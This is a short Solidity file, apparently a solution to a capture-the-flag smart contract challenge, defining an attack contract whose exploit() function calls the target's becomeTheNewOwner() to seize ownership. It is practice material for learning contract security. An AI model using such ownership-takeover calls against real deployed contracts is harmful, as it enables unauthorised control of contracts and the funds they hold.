// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/easyChalls/BecomeTheNewOwner.sol";

contract attackBecomeTheNewOwner {
    BecomeTheNewOwner originalContract;

    constructor(address _originalContract) public {
        originalContract = BecomeTheNewOwner(_originalContract);
    }

    function exploit() public {
        originalContract.becomeTheNewOwner();
    }
}